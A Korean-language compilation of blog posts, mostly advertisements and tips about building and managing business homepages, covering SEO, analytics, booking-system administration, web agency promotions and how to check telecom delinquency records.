검색사이트 무료등록해드립니다.네이버, 다음, 구글 무료등록해드리고 있으니언제든지 전화주십시요^^대전홈페이지 제작 홈페이지 안내www.hanasolution.net 대전홈페이지제작 하나솔루션홈페이지제작, 쇼핑몰제작, 모바일제작, 어플제작, 웹사이트제작, 웹템플릿, 유지관리무료, 키워드광고, 블로그제작, 홍보,광고,마케팅대행www.hanasolution.net 카카오톡으로 상담을 원하시면 클릭하세요카카오톡으로 상담해드립니다.  네이버 톡톡상담을 원하시면 클릭하시면 톡톡상담해드립니다.간편하게 궁금한것만 상담 받길 원하시면 카톡이나 톡톡으로 문의해주세요성심을 다해서 답변해드리겠습니다.  하나솔루션대전광역시 서구 둔산중로 19 샤크존 F15호 대전홈페이지 제작 하나솔루션 오시는길입니다.조심히 오세요오시면 2층으로 주차후 아주결혼정보 옆사무실로 오시면 되세요^^오늘하루도 편안한 하루보내세요^^  #홈페이지제작 #대전홈페이지제작 #쇼핑몰제작 #모바일제작 #마케팅대행 #블로그제작 #블로그광고#블로그포스팅 #블로그배포 대개 비영리 영역에서는 다양한 분야의 실무를 한 사람이 감당하느라 특화된 전문 역량을 쌓기 어려운 게 현실입니다. 2020년 하반기 서울시NPO지원센터, 희망제작소, (준)비영리채널네트워크에서는 비영리 활동가의 고민을 나누고, 분야 별 역량 강화를 위한 무료 유튜브 중계 강연 ‘실무충전’을 열었는데요. 다섯 차례에 걸쳐 진행된 강연의 알짜 정보를 모아 전합니다.  단체의 얼굴인 홈페이지, 최적화된 홈페이지로 거듭나고 싶지만, 어디서부터 시작해야 할 지 막막할 때가 있죠. 좀 더 많은 사람들에게 효과적인 콘텐츠를 보여주기 위한 몇 가지 노하우를 위드위시의 조가원 님의 강연으로 전합니다.​ ​  📌 SEO, 검색 엔진 최적화는?​✔ 홈페이지의 검색 결과는 어떻게 보이나요. 검색 결과에서 주소, 이미지, 제목, 설명 등 정보가 제대로 나오는지 확인하고 조정합니다.​✔ 홈페이지 브라우저 화면에서 우클릭, 요소 검사 또는 검사 메뉴 선택, 홈페이지 소스 코드 중 상단 head 태그 안에 meta 태그 정보를 확인합니다.​✔ meta 태그 요소 중 og, twitter, facebook 등의 property 값을 사용해 매체별 이미지(image), 제목(title), 설명(description) 등의 설정이 가능합니다.​✔ 들어갈 내용(제목, 설명, 이미지, 키워드)만 정리해서 개발자에게 채널별 meta 태그 삽입을 요청합니다. 코드를 전달하기 보다는 내용 중심으로 구성해서 구글 로봇/크롤러가 이 내용을 수집해 갈 수 있도록 조치를 요청합니다.​✔ 페이스북 디버거 사이트를 통해서 페이스북용 설정 값을 확인할 수 있습니다.​​📌 추적도구, 구글 애널리틱스 설정은?​✔ 직접 주소를 입력하고 들어왔는지, 검색창을 통했다면 구글인지, 네이버인지, 다음인지 등 홈페이지의 유입 경로를 확인할 수 있습니다. 이 외에도 사용자 유입 시간, 유입 장치(모바일, 데스크탑), 콘텐츠 별 유입량, 키워드 등의 정보를 확인할 수 있는데요. 이를 기반으로 홈페이지 운영 방식이나 콘텐츠를 점검할 수 있습니다.​✔ 이벤트, 캠페인 설정을 통해 캠페인 별 유입량을 확인할 수 있습니다. 홈페이지 콘텐츠간 이용 흐름도 확인할 수 있는데, 2단계 이상 넘어가지 않는 경우 홈페이지 구성이 전반적으로 점검되어야 합니다.​✔ 페이지 간 이동, 기기별 클릭 참여율 등 객관적인 데이터를 기반으로 홈페이지 내 콘텐츠 내용과 구성을 점검하고 조정합니다.​​📌 온라인 키워드 광고로 실험하기​✔ 검색 엔진 최적화와 추적도구를 설치한 후 구글 키워드 광고를 소액으로라도 실험해보기를 추천합니다. 웹마스터 도구, 서치 콘솔, 비즈니스 관리자, 광고 관리자를 연동, 세팅 후에 실행해보기를 추천하지만 어렵다면 광고 집행부터 하셔도 무방합니다.​✔ 소액 키워드 광고 집행을 통해 어떤 키워드로 유입되는지, 경쟁상대는 어디인지를 알아볼 수 있습니다.​✔ 기존 회원을 활용한 페이스북/인스타그램 광고를 집행해봅니다. 페이스북 광고 관리자에서 광고 집행 캠페인을 설정하고, 맞춤 타겟 메뉴에 기존에 보유한 이메일, 휴대번호 리스트를 등록해 광고를 진행합니다. 기존 고객을 대상으로 하는 만큼 비용 당 저렴하게 운용해 볼 수 있습니다. 이렇게 주소록을 기반으로 타겟을 설정하면 기존 고객과 유사한 대상에게도 노출되는 만큼 비용 대비 효율적으로 광고를 운영할 수 있습니다.​​📌 홈페이지 콘텐츠 구성하기​✔ 최신 콘텐츠를 제일 상단에 위치될 수 있도록 하며, 일주일 또는 한 달 단위로 변경할 수 있도록 콘텐츠 구성 계획을 수립합니다.​✔ 모바일과 데스크탑에서 동일하게 보여지는 구성인지 점검하도록 합니다. 특히 모바일에서 어떻게 보여지는지를 점검합니다.​✔ 중요한 정보 전달은 팝업 보다는 상시적으로 화면에 배치되는 플로팅 버튼 방식을 활용합니다.​✔ 쉬운 회원 가입을 위한 다양한 서비스를 이용합니다.​✔ 가치나 미션 어려운 말 대신, 우리가 무슨 일을 하는지 명료하게 전달합니다. 그리고 후원자의 참여로 무엇이 달라지는지, 어떤 변화를 가져올 수 있는지를 전달할 수 있도록 구성을 고민합니다. 현재의 문제를 부정적으로 드러내기 보다는 문제로 인해 무엇을 필요로 하는지를 구체적으로 전달합니다.​​📌 홈페이지 관리 업체 선정하기​✔ 페이지의 모든 파일에 대한 권한(접속해서 파일을 다운받고 수정할 수 있는 권한)을 제공하는 업체를 비교 견적, 추천 등을 통해 선정하고 구축하시기를 추천합니다.​꼭 애널리틱스가 아니더라도 이용자를 추적할 수 있는 시스템을 개발하고, 한 달에 하루 정도는 사용자에 대한 데이터를 기록하고 점검하는 습관, 마인드셋을 갖자고 제안드립니다. 마케팅 트렌드, 기술 트렌드 등에 대한 관심을 유지하고 다양한 어플리케이션으로 실험을 진행해야 합니다.​고유의 자산을 만드는데 집중하시기를 제안합니다. 때마다 달라지는 활동 방식이 아니라 우리 단체만이 유지할 수 있는 브랜드 요소를 쌓아가기를 바랍니다.우리 단체를 대표할 수 있는 단 한장의 사진은? 핵심 고객, 후원자는 누구인지, 신규 활동가, 후원자의 특성은 무엇인지에 대한 고민이 선행되어야 합니다. 이는 브랜드 전략을 수립하는 과정으로 우리는 누구에게 어떤 가치를 말하고자 하는지, 반드시 행동, 인식의 변화를 이끌어내고 싶은 타겟 그룹은 누구인지를 명확하게 하는 것부터 필요합니다.​핵심 메시지와 핵심 타겟이 확실하게 정해져 있어야 한정된 자원에서 효과적이고 효율적으로 운영될 수 있습니다. 즉 우리의 모든 자원은 핵심 가치와 핵심 후원자를 향해야 합니다.비영리 활동가가 현장에서 생긴 고민을 질답 형식으로 소개합니다.  비영리 활동가가 현장에서 생긴 고민을 질답 형식으로 소개합니다.​Q. 블로그만 운영하면 안되나요? 꼭 홈페이지가 있어야 하는지 궁금합니다.​“지금 할 수 있는 것을 하자” 블로그만으로 됩니다. 가치를 전하고 알리는 방식에는 왕도가 없다고 생각합니다. 다만 리소스를 쌓고, 관리하고, 광고와 효율을 동시에 보면서 고객층의 반응을 지속적으로 모니터 하며 전략에 피드백 할 수 있는 통합적인 관점의 확장성을 고려하여 ‘홈페이지’를 중심으로 설명드린 발제입니다. 성장의 방향과 단계를 고려할 것이냐, 지금 할 수 있는 것에 집중할 것이냐 에서부터 브랜드 전략이 달라지는 것이라 생각합니다. 블로그만 쓴다면 오히려 왜 블로그만 쓰나요? 라는 대답에 준비가 되어있으면 됩니다.​Q. 홈페이지를 외주 운영 시 고려할 사항이 궁금합니다.​"모든 내용은 이메일을 통해 확인할 수 있도록 아카이빙하자.”“정확한 가이드 라인과 업무 지시서를 제공하자.”“수정과 백업의 지원 및 교육이 이루어질 수 있도록 하자.”​위 세 가지 조건을 고려하는 게 좋습니다.​Q. 홈페이지 운영을 위한 인력 구성은 어떻게 하면 좋을까요.​내부 2인 또는 외부 2-3인 구성이 적절합니다. 각 인력구성은 아래처럼 진행하는 게 효과적입니다.​- 1인 기획자 (월간 업무 30% 구성, 주 1회 월 1회 백업 및 수정 사항 확인)- 1인 원고 개발 작가 및 디자이너 (월 30만원 내외) : 기획 뉴스 , 업데이트 소식 게시용 제작 > 블로그, 페이스북 등 재생산- 키워드 광고 (외주 대행사, 수수료 없는 대행사 많음)- 총괄 관리자 (데이터, 광고대행료, sns 게시 등 최종 관리 월 업무 10%)​Q. 홈페이지를 새로 제작할 때 고려할 사항은 무엇인가요.​앞선 언급한 내용을 포함하되 검색엔진 최적화(SEO) 관리가 가능한 지 따져봅니다.​홈페이지 유입 분석 방법 및 비영리 캠페인 페이지의 기본 요소가 무엇인지(보안 설정, 서버 용량 확보 등 홈페이지 틀 외에 기본적으로 갖춰야 할 요소)를 확인합니다.​홈페이지의 최종 목표는 후원 및 자원봉사(참여) 증진 페이지로 연결하는 것임을 잊지 마세요.​그리고 https는 꼭 하세요.​서버 용량은 크게 고민하지 않으셔도 됩니다.​Q. 검색 최적화된 홈페이지 구성은 무엇인가요.​구글 스니펫 검색 추천이나 h1 , h2 등 홈페이지 기본 구성 요소를 활용하는 등 기본적으로 기술 부분과 연관이 있습니다. 국내에서는 현재 검색엔진 최적화(SEO)조차 제대로 설정되어 있지 않은 경우가 태반이라 가장 먼저 SEO 설정 이후 천천히 알아가면서 적용하는 걸 추천합니다.​Q.때로는 모든 데이터가 유효한 것 같지 않습니다. 어떤 데이터를 주의 깊게 살펴보고, 운영 전략을 짜야 하는지 궁금합니다.​데이터는 생각이나 방향이 시장에서 통했는지 확인하는 방식입니다. 여러 전략으로 논의가 지연될 때 참고하는 지표이기도 합니다. 따라서 어떤 데이터가 유의미한 지 파악하기 위해서는 데이터셋 확보가 먼저 선행되어야 합니다. 기술적인 추적 도구가 아니어도 2년 이상 업무를 맡은 담당자 분 머릿속에는 이미 ‘데이터셋’이 있기 마련입니다.​이를 ‘가설-실험(실행)-검증- 피드백’ 단계로 구현하는 것만으로도 이미 데이터 중심의 단계에 이르렀다고 볼 수 있습니다. 어떤 메시지를 어떻게 전달하는 게 좋을 것 같다는 아이디어에서 시작해 이를 검증하고 이를 브랜드만의 레거시를 쌓아가는 과정이 곧 마케팅 과정으로 볼 수 있습니다.​* 본 게시물을 희망제작소 홈페이지 채널에도 공동으로 게재되었습니다. 네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가 학원홈페이지 관리!! 이제는 어렵지 않아요~예스소프트의 독립형이러닝솔루션이 새롭게 출시되었는데요!!지금부터 어떤~ 혜택과 특징이 있는지 살펴보아요^^ 학원홈페이지를 어떻게 준비해야할지,어디서부터 준비해야할지 고민이실텐데요~초보도 관리 가능한 독립형이러닝솔루션이 다른 어떤 사이트보다합리적인 가격으로 출시됐습니다~초보자도 관리가 가능한 독립형이러닝솔루션은관리페이지의 기능이 무려 50가지나 있는데요~관리자 주요 기능은 서브관리사 설정 기능 / 관리자 아이파허용 기능 / 회원출결관리 / 강의아이콘 설정 / 모바일 웹설정 등아래의 링크를 통해서 더 자세한 기능을 확인해 보시는 것을 추천 드립니다~ http://www.yesoft.net/_sol/elearning_view.asp예스소프트-1인창업솔루션,프로그램개발,웹솔루션,홈페이지제작업체www.yesoft.net예스소프트 솔루션을 구매하게되면초기비용만 들이면 추가적 비용없이 저렴하게 사용할 수 있습니다~ 가격적인 부분의 외에도 11가지 구매혜택을 만나볼 수 있는데요~혜택은 다음과 같아요~인터넷 이러닝 서비스는 이제는 뗄래야 뗄 수 없는 시대죠~그럼에도 불구하고 관리가 어려워 망설여지시는 분들은예스소프트의 독립형이러닝솔루션을 직접 무료로 상담받아보시고~이러닝서비스를 시작해 보시는 것을 추천 드립니다 !>> 예스소프트 독립형이러닝솔루션 무료상담 받으러 바로가기 클릭*본 포스팅은 해당 업체의 홍보성 내용을 포함하고 있습니다.    ​노동법률사무소 시선 사건관리 홈페이지 소개     노동 사건을 진행하면서 본 사무소와 의뢰인 모두 소통의 필요성을 깊이 느낀다. 대리인은 의뢰인에게 사실관계를 추가적으로 묻거나, 자료를 더 확보할 수는 없는지 등을 확인하여야 하고, 의뢰인은 현재 사건이 어떻게 진행되어 가고 있는지 확인하고 싶기 때문이다. 대리인과 의뢰인의 소통은 사건 승소에도 직간접적으로 많은 영향을 미친다. 이에 본 사무소는 의뢰인과의 밀착된 소통을 위하여 사건관리형 홈페이지를 구축하였다.    <시선 홈페이지 로그인 화면>         시선의 홈페이지에서는 사건 처리 현황과 문서 일람 등을 확인할 수 있고, 각 의뢰인에게 제공되는 비밀상담게시판을 통하여 본 사무소에게 심도 있는 상담을 받을 수 있다. 회원가입은 무료이다.    <시선 홈페이지 1:1 상담>  <시선 홈페이지 사건 조회>    http://www.siseon.co.kr/ 소통의 첫 단계 첫인상! 맞는 경우도 있고, 알고 지내니 다른 경우도 있죠?하지만 일관성을 유지하려는 마음은 쉽게 바뀌지 않다 보니 참 중요합니다. 홈페이지제작및관리에 대한 첫인상, 어떤 느낌인지 궁금합니다 ^^정확한 건 지금 알려드리는 홈페이지제작및관리 정보가 제대로인 거죠~홈페이지는 온라인 상으로 활동하는 고객들의 시선을 끌어당겨, 매출을 향상시키는데 가장 크게 기여하는 필수 요소입니다.홈페이지 제작을 계획하는 경우, 일반적인 경우 홈페이지에 대한 전문적인 지식이 부족하기 때문에 홈페이지 제작업체를 골라서, 제작을 맡기는 것이 좋은 방법입니다.그리고 회사 홈페이지 홍보 웹페이지라면 자리가 잡힐 때까지 초기 1년 쯤은 지원 받는 것이 안정적입니다. 하지만 거의 수정이 필요 없을 경우라면 직접 운영하는 것도 가능합니다.만약 기업 홍보형 홈페이지를 제작하는 경우라면 기업의 개요와 제품 비즈니스에 대한 파악이 우선으로 되고 목표하는 방향에 맞추어 만드는 것이 중요합니다. 반면에, 공공기관 또는 산하단체 협회는 신뢰를 기초로 하여 전달력 및 사용자의 편리함을 바탕으로 홈페이지를 제작해야 합니다.홈페이지 관리 중 컨텐츠나 페이지를 과실로 삭제했을 상황을 대비하여 백업 작업은 필수입니다.홈페이지를 미리 백업해 두었다면 자유롭게 원상복원이 가능합니다.홈페이지 제작 완료 후 부족한 부분을 정리해나가다보면 수정한 부분이 마음에 들지 않아 원상태로 되돌아가고 싶은 경우가 있기 때문에 반드시 백업을 해두는 것이 바람직합니다.  반면에, 어느 정도 업체 규모가 있는 웹호스팅 업체는 자체 백업 프로세스가 있기 때문에, 업체 결정 시 유념하시기 바랍니다.그리고 자신이 가진 홈페이지의 계정 공간 상에 자료 파일들을 올리는 방법은 내 개인컴퓨터에에 저장되어 있는 파일을 웹 서버상에 보내서 저장해두는 것입니다.  또한 홈페이지 주문제작을 회사에 맡겼을 때엔 백업 계약도 약정해 놓으시면 좋은데요.계약 사항에 일정한 기간마다 백업 문서를 제공받기로 명시해 둔다면각종 파일과 소스를 보장받을 수 있기 때문입니다.   관능적이며 고객의 호기심을 끌어당기는 웹디자인을 원하신다면 디자인팩토리를 찾아주세요.  디자인팩토리는 웹사이트부터 모바일 앱, 모바일어플 등 IT 기반의 디자인 솔루션을 제공하는디자인전문업체로 많은 고객으로부터 사랑받고 있습니다. 한 획의 글자, 하나의 점에도 여러 가지를 고려하여 제작하고 있으며 소비자가 사용하기 수월하고업체를 각인할 수 있는 효율적인 디자인을 지향하고 있습니다.   마케팅적 지식과 디자인적 노하우로 만족도 높은 디자인을 제작해 드리겠습니다. ‘매일을 비행 전 점검이라고 생각하고, 매일 아침 자신에게 이륙할 준비가 되었는지를물어야 한다’는 명언이 있습니다.오늘 홈페이지제작및관리에 대한 정보를 통해 저와 함께 한 비행은 어떠셨나요? 쌓인 정보만큼 내일 좀 더 가볍게 하루를 시작할 수 있으시길 바라요~!  네이버 블로그는 맞지만, 확인불가출처: 방송통신 신용정보 공동관리 홈페이지 캡처휴대폰 요금을 미납하거나 장기 연체가되는 경우 서비스 신규가입과 기타 신용보증서 발급 제한이될 수 있는데요내가 현재 통신사 불량으로 등록되어 있는지 연체 내역이 있는지에 대해 조회해볼 수 있는 사이트가 있습니다.오늘은 내가 통신 연체나 불량으로 등록되어 있는지 확인하는 방법에 대해 알아보겠습니다.​통신 연체를 조회할 수있는 곳은 한국정보통신진흥회에서 운영하는 '방송통신 신용정보 공동관리' 사이트인데요이 사이트는 상습/고의적인 요금 연체 및 비정상 이용을 방지하기 위해 방송통신 사업자의 신용정보를 관리하는 사이트입니다.​'방송통신 신용정보 공동관리' 참여기관은 이동통신은 KT(무선), LG U+(무선), SK텔레콤 등이며 유선통신사는 SK브로드밴드, KT(초고속인터넷), KT(유선전화, 인터넷전화) 등으로 거의 모든 사업자가 참여한다고 보시면됩니다.​본인 통신사 불량 연체 기록 조회방법은 신용정보공통관리 홈페이지에 접속하셔서 본인 신용정보를 클릭 후 본인 인증을 하면 현재 통신 서비스 연체 사항에 대해 조회가 가능합니다.https://www.credit.or.kr/ 방송통신 신용정보 공동관리본인신용정보 조회하기 신용정보 제공사실 조회하기 서비스 이용안내 신용정보 활용체제의 공시www.credit.or.kr 이 사이트에서는 신용정보 조회 뿐만아니라 신용정보 조회 제공사실끼지 확인이 가능합니다.제공되는 통신 연체 불량 정보는 1만원 이상 2~3개월 연체시 정보가 제공되며 통신사 정책에 따라 기준이 상이 할 수 있어 연체가 되었더라도 조회가 안되는 경우가 있습니다. 또한 통신불량 정보가 등록되더라고 금융 신용등급에 지장이 없는데요 다만 통신사 측에서 신용정보회사에 연체 정보를 제공하는 경우 신용등급이 하락할 수 있습니다.만약 연체 정보가 등록되어 있다면 휴대전화 또는 인터넷 TV 등 신규 서비스 가입이 제한될 수 있는데요연체 정보를 해지하려면 해당 통신사로 연락 후 정확한 연체금액을 확인하시어 연체된 요금을 납부하면 연체 정보가 해제 됩니다.  #휴대폰 #인터텟 #통신사불량 #연체내역 #인터넷조회 #사이트 #신용정보공동관리 #홈페이지    고객이 물품을 구매할때는 홈페이지 접속후 외부와 내부 사진들을 둘러보고 구매를 하기로 결심하게 되면 홈페이지 구석구석과 커뮤니티를 자세하게 살펴보게 됩니다.  선택한 물품에 대한 평가가 궁금하고 물품의 질은 괜찮은지, 배송은 빨리 되는지 궁금해지기 시작합니다.그러나 대부분의 홈페이지는 스튜디오에서 잘 찍은 사진과 간단한 설명글로만 이루어져 있어서 실질적으로 어떻게 생겼는지, 어떻게 작동하는지 알기가 힘듭니다.  하지만 홈페이지에서 알고 싶은 정보가 충족되지 않으니 전화로 이것저것 궁금한 것들을 물어보게 됩니다. 그래서 회사의 상담전화는 늘 연결중이게 되고, 급기야 상담직원을 따로 두게 됩니다.  이 경우 홈페이지를 조금만 더 세심하게 고객 입장에서 배려하고 관리를 한다면 어떨까요? 첫째 : 요즘은 고객들은 알고 싶은 게 많습니다.   물품의 질감은 어떤지, 정확한 치수나 형태가 어떻게 되는지 사진으로는 표현하기 힘듭니다.  동일한 내용의 문의를 몇 번을 반복해서 다른 고객들에게 받았다면 반드시 홈페이지를 확인해 봐야 합니다. 홈페이지 제조사가 아닌 관리자가 직접 관련 사항이나 특이점, 참고점을 기재해주셔야 합니다. 둘째 : 공지사항을 잘 관리해야 합니다. 홈페이지를 만들 때 "홈페이지가 오픈하였습니다!" 라는 글 하나만 있는 홈페이지도 간혹 눈에 띕니다. 각 시즌에 맞는 공지를 띄우면 고객에게 잘 관리되는 홈페이지로 기억될 것이며, 고객은 즐겨찾기에 해당 사이트를 기꺼이 등록할 것입니다.  셋째 : 자주하는 질문 모음 게시판을 별도로 만들어 놓는게 좋습니다.  배송 및 환불건 등 으레 반복되는 문의들이 있습니다. 이 문의들을 모아서 자주하는 질문에 대한 답변 목록을 만들어 놓으면 고객들에게 아주 유용한 정보가 됩니다. "질문과 답변" 게시판은 고객의 새로운 글이 올라와 즉시 답변하는 관리용도로 사용하고 "자주하는 질문"모음은 관리자가 고객들에게 미리 정보를 제공하는 공지용도로 사용하면 홈페이지 운영에도 좋고 유지하기도 편합니다. 홈페이지 관리는 가장 기본적인 것일 수도 있으나 아주 중요한 부분인데 놓치고 가는 경우가 많습니다.이번 기회에 다시 한 번 홈페이지를 둘러보고 수정해 보는게 어떨까요?이번칼럼내용에서는 booking 숙박예약 관리메뉴를 짚어드립니다. ​두부플러스의 숙박예약 시스템은 쉽고 편리한 예약시스템으로 온라인에서도 예약관리를 편리하게 할 수 있는 장점이 있습니다.​​​1) 앱> 숙박예약 메뉴의 주된 사용은,​"객실 등록" 및 "사이트 예약건을 예약관리 페이지에서 확인" 관리하는 점이며,​2) 환경설정> 숙박예약관리는 “숙박예약 업체의 규정/설정”부분입니다. ​객실 개별 설정이 아닌 숙박업체의 규정이나 이벤트, 전체적인 설정부분을 제어합니다.​​​​1) 경로 : [운영모드> 환경설정> 숙박예약관리]​[숙박예약> 숙박예약목록]에서 이미지를 클릭하면, [객실관리, 예약관리, 예약현황]을 관리할 수 있는 메뉴로 넘어갑니다.​    ​-객실관리 : [객실등록]을 통해 객실 정보를 등록할 수 있으며, 등록된 객실은 목록에서 확인할 수 있습니다.처음 숙박예약 홈페이지 만드셨다면 객실등록 이후 객실정보 업데이트 이전까지는 해당 페이지에서 수정 할 일은 거의 없지만(객실명, 객실수, 인원, 이미지 등)비/성수기 가격정보는 년마다 또는 월마다 수정이 필요한 부분입니다. 해당 페이지에서 객실가격을 수정하실 수 있습니다.​​-예약관리 : 숙박예약 홈페이지에서 예약완료 된 건들은 예약관리에서 확인하실 수 있습니다.객실별 이용일, 결제자의 결제방법, 결제금액 등을 확인할 수 있습니다. 예약건의 [예약대기, 예약완료, 이용완료, 예약요청, 예약승인, 예약불가] 상태를 관리자가 변경 할 수 있습니다. ​-예약현황 :달력/리스트를 통해 객실별 예약 상태를 한눈에 확인할 수 있습니다. 예약가능 텍스트를 클릭하면, 관리자가 자체예약등록도 가능합니다.​​​​​​[예약환경설정]버튼을 클릭하면, [숙박예약관리> 기본설정] 메뉴로 다이렉트 이동됩니다.​  ​2) 경로 : [운영모드> 환경설정> 숙박예약관리]​​- 기본설정 :예약환경설정을 통해 [온라인예약 / 전화문의 / 이메일문의]를 설정할 수 있고, 예약과 동시에 온라인 결제를 하거나 예약 후 사용일 당일 현장결제를 설정할 수도 있습니다.온라인결제로 운영하는 경우 예약보증금을 설정 할 수 있습니다(예약취소 시 구매자에게 환불 불가로 안내됨)예약기간설정은 금요일, 주말 성수기 등을 설정하며, 해당 메뉴는 월, 년, 시즌 별로 확인하여 설정을 변경하셔야 합니다. 이 외에도 숙박예약에 대한 전반적인 동일 된 설정이 가능합니다.​  ​​- 일별설정 : 객실명에 따른 예약방식, 예약기간 설정(성수기 비수기, 금요일/주말 설정)​- 규정설정 : 수수료나 환불 규정 업체의 기준 설정​- 할인설정 : 객실별 할인이벤트 설정 (전체 할인, 객실별 설정 할인 가능)​- 옵션설정 : 자전거, 바비큐, 조식, 픽업 등 옵션설정 가능 (전체. 객실 개별 설정가능)​​​숙박예약관리에서 필요한 부분만 참고하시어 쉽게 편리하게 운영해보시기 바랍니다.​이외에도 숙박예약 상태 변동 시 알림설정, 객실등록하기, 실시간예약검색목록의 항목설정부분 등을 세세하게 칼럼으로 안내드릴 예정입니다.​​혹시 궁금하시거나, 더 추가되었으면 하는 내용이 있다면 1:1문의하기나 메일로 요청주시기 바랍니다.​ ​​​ 중고차 홈페이지 관리하시는 분들이 간과하고 있는 것이 정확한 콜량 체크입니다 운영자중 대부분이 광고대행사한테는 신경을 더 써달라고 콜량을 줄여서 알려주는 경우가 많습니다. (물론 콜량을 체크 안하는 것은 말도 안되고요)또는 정확한 보고가 안 들어와서 콜량이 줄기도 합니다. 그러나 이런 경우는 서로 자멸할 수 있습니다. 정확한 판단을 할 수 없기 때문입니다   중고차 홈페이지 광고의 기본은 접속량, 콜량, 방문률로 판단할 수 있는데 접속량이야 정확하게 파악이 되나 콜량과 방문률은 딜러한테 모니터링할 수 밖에 없습니다. 그 과정에서 누락 또는 의도적인 조정이 된다면 광고의 정확한 판단이 되지 않습니다   그래서 중고차 홈페이지 관리를 담당한 분은 오프라인상의 어느 정도 장악력이 있어야 합니다. 딜러들한테 정확한 보고가 올라올 수 있도록 조직의 장악력이 필요합니다. 모든 콜이 동등하게 오지는 않습니다. 그런데 많이 받는 딜러는 절대 자랑하지 않습니다. 콜을 못 받는 딜러들만이 불평을 합니다물론 이런 불만을 개선하고 해소해야 하지만 개개인의 능력에도 영향이 있습니다. 이런 개인의 영향요인을 중고차홈페이지한테전가하고 다닌다면 안 좋은 소문만 무성할 것입니다 그래서 중고차 홈페이지 관리를 위해서는 정확한 데이타가 필요하고이를 기반으로 많은 분석과 개선이 필요합니다      중고차 홈페이지 관리의 역할은 콜량까지로 보는 것이 맞습니다. 물론 그 전단계까지 무조건 홈페이지에 역량이라고 할 수 없지만 반대로 콜이후에 방문은 중고차 홈페이지 관리에 있어 딜러분들의 몫으로 보는 것이 맞을 것입니다  콜량 보고 방법과 절차는 영업적인 노하우라 말씀드리지 못하나 자세하게 받으시라는 말씀은 드릴수 있습니다중고차 홈페이지 관리를 담당하는 분들에게 많은 도움이 되셨으면 합니다      네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가사장님!! 홈페이지 있으시죠??없다구요??제작도 관리도 힘들어서 홈페이지는 고민이시라구요??​무료 홈페이지 제작해 보시죠!!바로 바른웹에서!! ​무료라 하니 퀄리티가 걱정되시나요?? PC 홈페이지 제작모바일 홈페이지 제작반응형 홈페이지 제작전문 디자이너가 직접 디자인합니다.#바른웹 에서 도와드립니다.​ ​무료제작 + 월 3만원의 관리비로 전문가 홈페이지를 가질 수 있습니다.5년 이후에는 비용이 발생하지 않기 때문에 오래 사업을 하는 고객님께비용 절감의 기회가 됩니다. ​관리비용 월 3만원 * 5년(60개월) =180만원으로 임대가 아닌 본인 소유의 홈페이지를 가질 수 있습니다!!​(주)바른웹은 7년간 10,000여개 이상의 홈페이지를 제작해 온 신뢰도 있는 회사입니다.​풍부한 경험으로 제작 비용을 무료로 제공할 수 있게 되었습니다."기업부설 연구소" 인증회사 (주)바른웹에서 온라인 사업을 시작하세요. 월 3만원의 관리비로  이 모든 혜택이 가능합니다.★ 최대 32페이지 무료제작★ 모바일 무료제작★ 원하는 도메인 무료등록★ 2차 백업 무료제공★ 방화벽 무료세팅​구글, 네이버 등 포털 사이트 등록 웹마스터도구 최적화 되어 있습니다!​ ​​바른웹에서 제작된 홈페이지도 둘러보시고, 무료 상담 요청도 하세요. 바른웹 - 비디오 서비스 플랫폼 자몽pick바른웹 무료로 고퀄리티의 홈페이지를 제작해주는 바른웹 에이전시 서비스를 추천합니다. - jamongpickjamongpick.com 임대형 홈페이지보다 훨씬 저렴한 비용으로(주)바른웹에서 홈페이지 장만하세요^^​#무료홈페이지제작#홈페이지제작업체#웹사이트제작#홈페이지제작비용#모바일사이트제작#반응형홈페이지제작#임대형홈페이지와가격비교#바른웹에서홈페이지소유하세요​본 포스팅은 상기 업체로부터 원고료를 받아 작성되었습니다.​​​​ 이제 막 사업을 시작한지 얼마 안 된 사업가입니다.오랜 준비 끝에 진행하는 사업인지라시기도 너무 안 좋고 진행 전부터 엄청 걱정이 많았는데막상 시작하고 나니 아직까지는 문제 없이 잘 진행하고 있습니다.이렇게 잘 운영되고 있는 이유 중 하나는 물론준비를 철저하게 한 덕분이기도 하지만사업 내용을 대표하는 홈페이지제작업체를진행한 덕분이 아닐까 싶어요. 종종 SNS나 블로그로만 운영하는 사업체를 종종 볼 수 있는데요.아무래도 홈페이지를 만드는데 비용이 꽤 드니까저도 이렇게 진행할까 고민이 많았는데장기적으로 내다봤을 때 홈페이지를 만드는 것이 고객들에게 신뢰를 줄 수 있겠다는 생각이 들어큰 맘 먹고 홈페이지제작을 진행하기로 했어요. 업체는 아는 지인 분의 소개를 받은 곳인데요.아마 제가 처음 알아보려고 했다면생각보다 시간이 더 오래 걸리지 않을까 싶어요.다행히 지인 분도 홈페이지 리뉴얼 때문에진행한 업체가 있는데 실력이 굉장히 좋아저한테도 적극 추천을 하더군요.그래서 저도 여기서 진행하기로 했어요. 물론 지인이 추천해줬다고 해서 무조건 바로 진행한 것은 아니고제 나름의 기준을 두고철저하게 검증을 거친 뒤 결정한 사안이에요.사실 홈페이지를 만드는 일이시간도 많이 걸리고 비용도 많이 걸리는 일이기 때문에아무 곳에서나 진행할 수 없잖아요.저도 큰 맘먹고 진행하는 건데정말 잘하는 곳에서 진행하고 싶었어요. 우선 홈페이지제작업체에 나온 포트폴리오를 통해실력 있는 곳인지 저희 홈페이지를 제대로 만들 수 있는 곳인지 확인 작업을 거쳤어요.그 다음으로 직접 만나 상담을 받아보고 싶었으나여건이 되지 않아 전화 상담을 통해 진행했어요.미리 질문할 리스트를 정리하여 상담 받았는데이렇게 진행하니 정말 궁금한 것들을답변으로 들을 수 있어 좋았어요.상담을 받다 보니 여기에 대한 확신이 생겨 최종적으로 결정했는데 업체명은 희명웹이라는 곳이었어요. 희명웹은 무려 19년간 9,000여개 홈페이지를 직접 제작 및관리를 하고 있는, 경험과 노하우가 무척 풍부한 곳이었어요.일반 홈페이지, 쇼핑몰제작, 모바일 홈페이지까지어떤 홈페이지든 제작할 수 있는 곳이었어요. 그리고 무엇보다도 희명웹은 기획자, 웹디자이너, 웹퍼블리셔,웹개발자와 같이 홈페이지를 만드는 데필요한 전문 인력을 보유하고 있기 때문에모든 과정을 자체적인 프로세스를 통해 진행하고 있어요.그래서 비용적인 부분도 합리적으로제공할 수 있을 뿐만 아니라 퀄리티 부분에 있어서도확실히 보상받을 수 있는 곳이기도 해요.​ 희명웹 상담을 가지면서 여러 부분들이 맘에 들었지만가장 좋았던 점은 